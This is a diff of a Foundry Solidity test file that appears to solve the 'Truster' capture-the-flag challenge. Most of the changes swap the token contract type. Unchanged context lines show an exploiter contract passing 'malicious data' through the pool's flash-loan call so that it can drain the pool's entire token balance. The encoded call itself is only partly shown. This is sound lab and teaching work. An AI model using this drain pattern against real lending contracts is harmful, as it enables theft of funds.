@@ -2,12 +2,12 @@
 pragma solidity ^0.8.20;
 
 import {Test, console} from "forge-std/Test.sol";
-import {MyToken} from "../../src/Token.sol";
+import {ERC20Mint} from "../../src/exchange/ERC20Mint.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
 contract TrusterExploiter {
 
-    constructor(TrusterLenderPool _pool, MyToken _token, address _recovery) {
+    constructor(TrusterLenderPool _pool, ERC20Mint _token, address _recovery) {
         // One transaction
 
         bytes memory data = abi.encodeWithSignature( // data encoded for functionCall()
@@ -23,7 +23,7 @@ contract TrusterExploiter {
             data // malicious data
             );
         
-        _token.safeTransferFrom(
+        _token.transferFrom(
             address(_pool), // from pool
             _recovery, // to recovery address
             _token.balanceOf(address(_pool))
@@ -38,7 +38,7 @@ contract TrusterChallenge is Test {
     
     uint256 constant TOKENS_IN_POOL = 1_000_000e18; // 1 million
 
-    MyToken public token;
+    ERC20Mint public token;
     TrusterLenderPool public pool;
 
     modifier checkSolvedByPlayer() {
@@ -54,7 +54,7 @@ contract TrusterChallenge is Test {
     function setUp() public {
         startHoax(deployer);
         // Deploy token
-        token = new MyToken("TestToken", "TT");
+        token = new ERC20Mint("TestToken", "TT");
 
         // Deploy pool and fund it
         pool = new TrusterLenderPool(token);
